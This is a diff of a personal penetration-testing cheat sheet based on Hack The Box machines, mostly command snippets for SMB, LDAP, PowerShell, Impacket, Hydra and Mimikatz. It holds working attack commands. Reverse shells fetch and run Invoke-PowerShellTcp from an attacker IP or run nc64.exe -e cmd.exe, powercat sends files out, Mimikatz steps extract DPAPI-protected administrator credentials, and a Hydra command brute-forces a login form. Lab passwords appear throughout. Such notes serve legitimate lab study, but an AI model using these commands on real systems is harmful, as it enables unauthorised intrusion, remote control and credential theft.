@@ -1,8 +1,9 @@
 ### Index
-
-1.  [Links](#Links)
+1. [Links](#Links)
 2. [Nmap](#Nmap)
-3.  [Samba](#Samba)
+3. [`FTP`](#`FTP`)
+	1. [`Anonymous Login`](#`Anonymous%20Login`)
+4.  [Samba](#Samba)
 	1. [`Trying to List smb share using Guest account`](#`Trying%20to%20List%20smb%20share%20using%20Guest%20account`)
 	2. [`Dumbing Password Policy through SMB Share`](#`Dumbing%20Password%20Policy%20through%20SMB%20Share`)
 	3. [`Connecting to specific SMB Share without username and password - Anonymously Accessing SMB Share`](#`Connecting%20to%20specific%20SMB%20Share%20without%20username%20and%20password%20-%20Anonymously%20Accessing%20SMB%20Share`)
@@ -15,45 +16,67 @@
 	10. [`Execute Command using smbmap`](#`Execute%20Command%20using%20smbmap`)
 	11. [`smbmap - Non Recursive Path Listing`](#`smbmap%20-%20Non%20Recursive%20Path%20Listing`)
 	12. [`Get a Reverse shell using smbmap. Make sure python server and nc listener is running.`](#`Get%20a%20Reverse%20shell%20using%20smbmap.%20Make%20sure%20python%20server%20and%20nc%20listener%20is%20running.`) 
-3.  [CURL](#CURL)
+5.  [CURL](#CURL)
 	1. [Download the file on the target.](#Download%20the%20file%20on%20the%20target.)
-4. [Ways to Get The Shell](#Ways%20to%20Get%20The%20Shell)
+6. [Ways to Get The Shell](#Ways%20to%20Get%20The%20Shell)
 	1. [RCE to Shell](#RCE%20to%20Shell)
 	2. [Getting Shell When you have password](#Getting%20Shell%20When%20you%20have%20password)
 	3. [`Using impacket-wmiexec`](#`Using%20impacket-wmiexec`)
 	4. [`Using smbclient`](#`Using%20smbclient`)
 	5. [`Using Telnet`](#`Using%20Telnet`)
 	6. [`Using smbmap to run powershell command`](#`Using%20smbmap%20to%20run%20powershell%20command`)
-	7. [`using rpcclient`](#`using%20rpcclient`)
-	8. [`Using PowerShell`](#`Using%20PowerShell`)
-	9. [`Print File Content using SQL Query (MYSQL)`](#`Print%20File%20Content%20using%20SQL%20Query%20(MYSQL)`)
-5.  [PowerShell & Active Directory](#PowerShell%20&%20Active%20Directory)
+	7. [`Using RunasCs.exe`](#`Using%20RunasCs.exe`)
+	8. [`using rpcclient`](#`using%20rpcclient`)
+	9. [`Using PowerShell`](#`Using%20PowerShell`)
+	10. [`Print File Content using SQL Query (MYSQL)`](#`Print%20File%20Content%20using%20SQL%20Query%20(MYSQL)`)
+7. [`Mimikatz`](#`Mimikatz`)
+	1. [`DPAPI Credentials`](#`DPAPI%20Credentials`)
+8. [`PowerShell`](#`PowerShell`)
 	1. [`Print all the environment variables using powershell`.](#`Print%20all%20the%20environment%20variables%20using%20powershell`.)
 	2. [`Importing PowerSploit and Other modules`](#`Importing%20PowerSploit%20and%20Other%20modules`)
 	3. [`Copy the whole PowerSploit Directory as follows`](#`Copy%20the%20whole%20PowerSploit%20Directory%20as%20follows`)
-	4. [`Checking the PowerShell history`](#`Checking%20the%20PowerShell%20history`)
-	5. [`File Transfer Using PowerShell`](#`File%20Transfer%20Using%20PowerShell`)
-6. [LDAP or WinDapSearch](#LDAP%20or%20WinDapSearch)
+	4. [`PowerShell To change User Session With Valid Credentials`](#`PowerShell%20To%20change%20User%20Session%20With%20Valid%20Credentials`)
+	5. [`Checking the PowerShell history`](#`Checking%20the%20PowerShell%20history`)
+	6. [`If PowerShell DoesNot Load Prompt`](#`If%20PowerShell%20DoesNot%20Load%20Prompt`)
+	7. [`File Transfer Using PowerShell`](#`File%20Transfer%20Using%20PowerShell`)
+9. [LDAP or WinDapSearch](#LDAP%20or%20WinDapSearch)
 	1. [`Anonymous Bind`](#`Anonymous%20Bind`)
 	2. [`Authenticated Bind`](#`Authenticated%20Bind`)
 	3. [`Get Specific User`](#`Get%20Specific%20User`)
 	4. [`LDAP With Credentials Enumeration`](#`LDAP%20With%20Credentials%20Enumeration`)
 	5. [`ToGether All Commands`](#`ToGether%20All%20Commands`)
-7. [WordLists](#WordLists)
+10. [WordLists](#WordLists)
 	1. [`Windows Path Traversal`](#`Windows%20Path%20Traversal`)
-8. [Alternate Data Stream (ADS)](#Alternate%20Data%20Stream%20(ADS))
+11. [Alternate Data Stream (ADS)](#Alternate%20Data%20Stream%20(ADS))
 	1. [`ADS CheckList - CheatSheet`](#`ADS%20CheckList%20-%20CheatSheet`)
-9. [Microsoft Access Database Files (MDB Files)](#Microsoft%20Access%20Database%20Files%20(MDB%20Files))
-10. [Personal Storage Table (PST Files)](#Personal%20Storage%20Table%20(PST%20Files))
-11. [`Impacket`](#`Impacket`)
-12. [`Grep`](#`Grep`)
-13. [`SSH`](#`SSH`)
-14. [`GoBuster & FeroxBuster`](#`GoBuster%20&%20FeroxBuster`)
-15. [`wfuzz & ffuf`](#`wfuzz%20&%20ffuf`)
-16. [`File Transfer From Kali to Target or Vice Versa`](#`File%20Transfer%20From%20Kali%20to%20Target%20or%20Vice%20Versa`)
+12. [Microsoft Access Database Files (MDB Files)](#Microsoft%20Access%20Database%20Files%20(MDB%20Files))
+13. [Personal Storage Table (PST Files)](#Personal%20Storage%20Table%20(PST%20Files))
+14. [`Impacket`](#`Impacket`)
+15. [`Hashcat`](#`Hashcat`)
+16.  [`NetExec or CrackMapExec`](#`NetExec%20or%20CrackMapExec`)
+17. [`Find Command`](#`Find%20Command`)
+	1. [`Finding a Writable Directory`](#`Finding%20a%20Writable%20Directory`)
+18. [`Grep`](#`Grep`)
+	1. [`Printing Uncommented Lines from file`](#`Printing%20Uncommented%20Lines%20from%20file`)
+	2. [`Grep to recover file content from /dev/sdb`](#`Grep%20to%20recover%20file%20content%20from%20/dev/sdb`)
+19. [`SSH`](#`SSH`)
+20. [`GoBuster & FeroxBuster`](#`GoBuster%20&%20FeroxBuster`)
+21. [`wfuzz & ffuf`](#`wfuzz%20&%20ffuf`)
+22. [`Hydra`](#`Hydra`)
+	1. [`Brute Forcing Login Form`](#`Brute%20Forcing%20Login%20Form`)
+23. [`Dump Login Passwords From Current Linux Users - Mimipenguin`](#`Dump%20Login%20Passwords%20From%20Current%20Linux%20Users%20-%20Mimipenguin`)
+24. [`File Transfer From Kali to Target or Vice Versa`](#`File%20Transfer%20From%20Kali%20to%20Target%20or%20Vice%20Versa`)
 	1. [`Using PHP`](#`Using%20PHP`)
-17. [`Exploits & CVE Reference - HTB Boxes`](#`Exploits%20&%20CVE%20Reference%20-%20HTB%20Boxes`)
-### Links
+25. [`TightVNC`](#`TightVNC`)
+26. [`Net User`](#`Net%20User`)
+	1. [`Identify Logon Scripts - Windows`](#`Identify%20Logon%20Scripts%20-%20Windows`)
+27. [`SQLite3`](#`SQLite3`)
+	1. [`Retriving Tables/Database/Columns/Schema`](#`Retriving%20Tables/Database/Columns/Schema`)
+28. [`Password Cracking OG Way`](#`Password%20Cracking%20OG%20Way`)
+	1. [`Cracking AES Password`](#`Cracking%20AES%20Password`)
+29. [`Exploits & CVE Reference - HTB Boxes`](#`Exploits%20&%20CVE%20Reference%20-%20HTB%20Boxes`)
+30. [`LFI / RFI`](#`LFI%20/%20RFI`)
+### `Links`
 
 - [LZone Cheat Sheet](https://lzone.de/#/LZone%20Cheat%20Sheets)  - Someone Name Lzone prepare a nice checklist on Docker container, CI/CD and various other things. Good One to check out
 - [CyberKhalid Cheat Sheet](https://cyberkhalid.github.io/categories/) - Just Another Checklist (FTP, AD, Kerberos, LDAP, Linux Persistence, Linux Privilege Escalation, SNMP, SSH, VNC, Windows Persistence, Telnet, etc.)
@@ -67,7 +90,8 @@
 - [CTF 101](https://ctf101.org/) - CTF Play Book
 - [Attacking Active Directory 0 to 0.9](https://zer1t0.gitlab.io/posts/attacking_ad/) - In-Detail Active Directory Methods 
 - [Sfoffo - Pentesting Notes](https://notes.sfoffo.com/)  - Another OSCP Checklist
-### Nmap
+- https://ntlm.pw/ - Cracking NTML NT/LM Hash Online (Cracking NTLM Online)
+### `Nmap`
 ```
 # nmap -p- -Pn <IP>
 # nmap -p- --min-rate=1000 -sC -sV -sT -T4 -A -Pn <IP>
@@ -79,7 +103,15 @@
 # nmap -p88,464 --script=krb5-enum-users --script-args=krb5-enum-users.realm='intelligence.htb',userdb=/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -sC -sV -T4 10.10.10.248
 
 ```
-### Samba
+### `FTP`
+###### `Anonymous Login`
+```
+$ ftp anonymous@access.htb
+$ ftp <RHOST>
+$ ftp -A <RHOST>
+$ wget -r ftp://anonymous:anonymous@<RHOST>
+```
+### `Samba`
 
 ###### `Trying to List smb share using Guest account`
 ```
@@ -142,8 +174,12 @@ putty.exe
 ```
 # smbmap -u'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -x 'powershell iex (New-Object Net.WebClient).DownloadString("http://10.10.14.2/Invoke-PowerShellTcp.ps1");Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 4444' -H 10.10.10.178 
 ```
-
-### CURL 
+### `mount`
+```
+# Mounting Share with valid Creds
+# mount -t cifs -o 'user=r.thompson,password=rY4n5eva' //10.10.10.182/Data /mnt/data
+```
+### `CURL`
 
 ###### Download the file on the target.
 ```
@@ -154,7 +190,7 @@ Run the following Command in Windows if Curl is Installed
 curl -o FileName http://Kali_IP/FileName
 ```
 
-### Ways to Get The Shell
+### `Ways to Get The Shell`
 
 ###### RCE to Shell
 
@@ -211,6 +247,11 @@ C:\Users\security>
 # smbmap -u 'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -x 'powershell iex (New-Object Net.WebClient).DownloadString("http://10.10.14.2/Invoke-PowerShellTcp.ps1");Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 4444' -H 10.10.10.178
 ```
 
+###### `Using RunasCs.exe`
+```
+C:\ProgramData>.\RunasCs.exe c.bum Tikkycoll_431012284 -r 10.10.14.5:4444 cmd
+```
+
 ###### `using rpcclient`
 ```
 # rpcclient -U 'bhult%Fabricorp012' 10.10.10.193
@@ -234,13 +275,46 @@ SELECT BulkColumn FROM OPENROWSET(BULK 'C:\users\miscsvc\desktop\user.txt', SING
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.4 -Port 4444
 ```
-### PowerShell & Active Directory
+
+### `Mimikatz`
+###### `DPAPI Credentials`
+```
+<Pay Attention to PATH>
+C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001>dir /a
+	08/22/2018  10:18 PM               468 0792c32e-48a5-4fe3-8b43-d93d64590580
+
+<Use CertUtil To Base64 Encode it>
+C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001>certutil -encode 0792c32e-48a5-4fe3-8b43-d93d64590580 output
+C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001>type output
+	------------BEGIN Certificate-----------------
+	------------END Certificate-------------------
+
+root@kali# cat masterkey.b64 | base64 -d > masterkey
+
+<Now Grab the Credential File - Pay Attention to Path>
+C:\Users\security\AppData\Roaming\Microsoft\Credentials>dir /a
+	08/22/2018  09:18 PM               538 51AB168BE4BDB3A603DADE4F8CA81290
+
+C:\Users\security\AppData\Roaming\Microsoft\Credentials>certutil -encode 51AB168BE4BDB3A603DADE4F8CA81290 output
+C:\Users\security\AppData\Roaming\Microsoft\Credentials>type output
+	------------BEGIN Certificate-----------------
+	------------END Certificate-------------------
+
+root@kali# cat credentials.b64 | base64 -d > credentials
+
+<Decrypting MasterKey> #On Local Windows Machine assuming that you've a password for Low Privilege User
+mimikatz # dpapi::masterkey /in:masterkey /sid:S-1-5-21-953262931-566350628-63446256-1001 /password:4Cc3ssC0ntr0ller
+
+<Use Masterkey to Decrypt Credential file> 
+mimikatz # dpapi::cred /in:credentialfile /masterkey:file_name [/masterkey:file_name option arg if it throw masterkey not found error]
+  CredentialBlob : 55Acc3ssS3cur1ty@megacorp  # ADMINISTRATOR PASSWORD
+```
+### `PowerShell`
 
 ###### `Print all the environment variables using powershell`.
 ```
 Get-ChildItem env:
 ```
-
 ###### `Importing PowerSploit and Other modules` 
 ```
 *Evil-WinRM* PS C:\Program Files\WindowsPowerShell\Modules\PowerSploit> Import-Module PowerSploit\Recon
@@ -254,24 +328,41 @@ CommandType     Name                                               Version    So
 -----------     ----                                               -------    ------
 Function        Add-NetUser                                        3.0.0.0    Recon
 ```
-
 ###### `Copy the whole PowerSploit Directory as follows`
 ```
 *Evil-WinRM* PS C:\tmp\PowerSploit> Copy-Item PowerSploit "C:\Program Files\WindowsPowerShell\Modules" -recurse -Force
 ```
+###### `PowerShell To change User Session With Valid Credentials`
+```
+PS C:\inetpub\wwwroot\blog> $username = 'Sniper\Chris'
+PS C:\inetpub\wwwroot\blog> $password = '36mEAhz/B8xQ~2VM'                             
+PS C:\inetpub\wwwroot\blog> $password = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
+PS C:\inetpub\wwwroot\blog> $cred = New-Object -typename System.Management.Automation.PSCredential -argumentlist $username,$password
+PS C:\inetpub\wwwroot\blog> Invoke-Command -ScriptBlock {whoami} -Credential $cred -Computer localhost
+sniper\chris
+PS C:\inetpub\wwwroot\blog> whoami
+iis apppool\defaultapppool
+PS C:\inetpub\wwwroot\blog> Invoke-Command -ScriptBlock {\\10.10.14.2\a\nc64.exe -e cmd.exe 10.10.14.2 4444} -Credential $cred -Computer localhost
 
+```
 ###### `Checking the PowerShell history`
 ```
 *Evil-WinRM* PS C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
 ```
-
+###### `If PowerShell DoesNot Load Prompt`
+```
+C:\Users\Administrator>powershell -File -
+PS C:\Users\Administrator> whoami
+access\administrator
+<!---If PowerShell Does not load a prompt when typing powershell in the console.---!>
+```
 ###### `File Transfer Using PowerShell`
 ```
 PS C:\ProgramData> curl -o powercat.ps1 http://10.10.14.2/powercat.ps1
 PS C:\ProgramData> powercat -c 10.10.14.2 -p 1234 -i "C:\Shares\IT\Apps\Sales Order Client\ScrambleClient.exe" 
 #Start the NetCat Listener using nc -l -p 1234 > FileName.exe
 ```
-### LDAP or WinDapSearch
+### `LDAP or WinDapSearch`
 
 Alternate tool: [WinDapSearch](https://github.com/ropnop/windapsearch)
 ###### `Anonymous Bind`
@@ -304,24 +395,24 @@ ldapsearch -x -h <RHOST> -b "dc=<RHOST>,dc=local" "*" | awk '/dn: / {print $2}'
 ldapsearch -x -h <RHOST> -D "<USERNAME>" -b "DC=<DOMAIN>,DC=<DOMAIN>" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 ldapsearch -H ldap://<RHOST> -D <USERNAME> -w "<PASSWORD>" -b "CN=Users,DC=<RHOST>,DC=local" | grep info
 ```
-### WordLists 
+### `WordLists`
 
 ###### `Windows Path Traversal` 
 -  [Cheatsheet](https://gist.github.com/SleepyLctl/823c4d29f834a71ba995238e80eb15f9#file-windows-path-traversal-cheatsheet) 
 
-### Alternate Data Stream (ADS)
+### `Alternate Data Stream (ADS)`
 
 ###### `ADS CheckList - CheatSheet`
 - [ADS Cheatsheet](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)
 - [ADS Check CLSID](https://github.com/tcprks/Rchitect/tree/Yoda/Scripts)
 
-### Microsoft Access Database Files (MDB Files)
+### `Microsoft Access Database Files (MDB Files)`
 ```
 mdb-tables -1 filename.mdb
 mdb-json filename.mdb auth_user
 ```
 
-### Personal Storage Table (PST Files)
+### `Personal Storage Table (PST Files)`
 ```
 # readpst -w Access\ Control.pst
 # cat Access\ Control.mbox 
@@ -351,14 +442,36 @@ impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
 impacket-smbserver a /home/ringbuffer/Downloads/Crafty.htb -smb2support -user lol -pass lol
 PS C:\Users\svc_minecraft\server\plugins> net use \\10.10.14.4\a /USER:lol lol
 ```
+### `Hashcat`
+###### `Mutating Password List`
+```
+# cat password 
+password$
+# hashcat --force password -r /usr/share/hashcat/rules/best64.rule --stdout > mutate_password
+```
+### `NetExec or CrackMapExec`
+```
+# Checking Password Policy Before Brute Forcing
+# netexec smb 10.10.10.182 --pass-pol
+```
+
+### `Find Command`
+###### `Finding a Writable Directory`
+`$ find . -writable`
 
 ### `Grep`
-```
-#Printing Uncommented Lines from file
-grep -v "^#" apache2.conf | grep .
+###### `Printing Uncommented Lines from file`
+`# grep -v "^#" apache2.conf | grep .`
+###### `Grep to recover file content from /dev/sdb`
+`# grep -aPo '[a-fA-F0-9]{32}' /dev/sdb`
 
-```
+###### `Grep to print Next Two and Previous Two lins of Matched Word`
+`# grep -a -A2 -B2 '[a-z0-9]\{32\}' /dev/sdb`
+`# grep -a -A2 -B2 'Damnit' /dev/sdb`
 
+### `Strings & XXD`
+###### `XXD to print non-empty content`
+`# xxd /dev/sdb | grep -v '0000 0000 0000 0000 0000 0000 0000 0000'`
 ### `SSH`
 ```
 #Creating Multiple SSH Tunnel 
@@ -379,10 +492,18 @@ gobuster dir -u http://aero.htb/ -w /usr/share/wordlists/dirbuster/directory-lis
 #Subdomain Enumeration
 wfuzz -c -w /usr/share/wordlists/amass/subdomains-top1mil-20000.txt --hl 186 -H "Host: FUZZ.aero.htb" -u http://aero.htb
 ffuf -H "Host: FUZZ.aero.htb" -u http://aero.htb/ -mc 200 -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -fl 187
-
-
 ```
 
+### `Hydra`
+###### `Brute Forcing Login Form`
+```
+hydra -l admin -P /usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt nibbles.htb http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username or password" 
+```
+### `Dump Login Passwords From Current Linux Users - Mimipenguin`
+```
+Just like Mimikatz on Windows, you can use mimipenguin on Linux machines
+https://nored0x.github.io/penetration%20testing/Dump-Login-Passwords-From-Current-Linux-Users/
+```
 ### `File Transfer From Kali to Target or Vice Versa`
 
 [File Transfer Checklist](https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/)
@@ -390,6 +511,55 @@ ffuf -H "Host: FUZZ.aero.htb" -u http://aero.htb/ -mc 200 -w /usr/share/wordlist
 ```
 $ php -S 0.0.0.0:8081  # You tried it out in Nibbles.HTB box.
 [Sat Sep 28 00:57:33 2024] 10.10.14.8:54430 [200]: /personal.zip
+```
+### `TightVNC`
+[VNC Password Decryptor TightVNC](https://github.com/jeroennijhof/vncpwd) 
+```
+echo '6bcf2a4b6e5aca0f' | xxd -r -p > vnc_pass    # Notice the '6bcf2a4b6e5aca0f' is the HEX value we obtained from the file.
+gcc vncpwd.c -o vncpwd
+./vncpwd ../vnc_pass 
+```
+### `Net User`
+###### `Identify Logon Scripts - Windows`
+```
+*Evil-WinRM* PS C:\> net user <username>
+*Evil-WinRM* PS C:\> net user <username> /domain
+```
+###### `Locating/Finding Logon Scripts`
+```
+*Evil-WinRM* PS C:\> Get-ChildItem -Path C:\ -Filter MapAuditDrive.vbs -Recurse -ErrorAction SilentlyContinue -Force
+```
+### `SQLite3`
+###### `Retriving Tables/Database/Columns/Schema`
+```
+# sqlite3 Audit.db 
+sqlite> .tables
+sqlite> .databases
+sqlite> .schema
+sqlite> Select * from Ldap;
+```
+### `Password Cracking OG Way`
+###### `Cracking AES Password`
+```
+# cat AES128_Decrypt.py 
+import pyaes
+from base64 import b64decode
+key = b"c4scadek3y654321"                                      # Assuming that you have a key
+iv = b"1tdyjCbY1Ix49842"                                       # Assuming that you have IV 
+aes = pyaes.AESModeOfOperationCBC(key, iv = iv)
+decrypted = aes.decrypt(b64decode('BQO5l5Kj9MdErXx6Q6AGOw==')) # Assuming that you have encrypted password
+print(decrypted.decode())
+```
+### `Active Directory Group - Priv Esce`
+###### `AD Recycle Bin Group`
+```
+*Evil-WinRM* PS C:\Users\arksvc\Desktop> whoami /groups
+CASCADE\AD Recycle Bin
+```
+###### `Get-ADObject List Deleted Items`
+```
+*Evil-WinRM* PS C:\ProgramData\temp> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects
+*Evil-WinRM* PS C:\ProgramData\temp> Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -Properties *
 ```
 ### `Exploits & CVE Reference - HTB Boxes`
 
@@ -414,3 +584,9 @@ $ php -S 0.0.0.0:8081  # You tried it out in Nibbles.HTB box.
 	- [Remote Buffer Overflow](https://www.exploit-db.com/exploits/36025)
 - Crafty HTB
 	- [Log4j](https://github.com/kozmer/log4j-shell-poc?tab=readme-ov-file) 
+
+### `LFI / RFI`
+
+```
+# python3 lfimap/lfimap.py -U 'http://10.10.10.111:9999/playsms/index.php?app=main&inc=core_auth&route='
+```
